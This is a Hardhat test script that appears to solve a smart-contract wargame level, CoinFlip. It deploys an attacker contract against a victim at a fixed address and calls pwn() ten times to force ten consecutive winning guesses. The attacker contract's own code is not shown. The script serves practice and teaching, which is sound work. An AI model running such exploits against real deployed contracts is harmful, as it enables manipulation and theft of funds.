import { TransactionResponse } from "@ethersproject/providers";
import { expect } from "chai";
import { BigNumber } from "ethers";
import { ethers } from "hardhat";

describe("Coin Flip", function () {
  it("Pwn", async function () {
    const ABI = ["function consecutiveWins() view returns (uint256)"];
    const ADDRESS = "0x03A79b76d3e53Ab3131Db6f05B18A5F9456Ca5FD";
    const victimContract = await ethers.getContractAt(ABI, ADDRESS);
    console.log("Deploying attacker contract...");
    const attackerContract = await ethers.deployContract("contracts/CoinFlip.sol:Attacker", [ADDRESS]);
    await attackerContract.deployTransaction.wait();

    console.log("Pwning victim contract...");
    for (let i = 0; i < 10; i++) {
      const tx: TransactionResponse = await attackerContract.pwn();
      await tx.wait();
    }
    const consecutiveWins: BigNumber = await victimContract.consecutiveWins();
    console.log(`consecutiveWins(): ${consecutiveWins}`);
    expect(consecutiveWins).to.equal(10);
  });
});
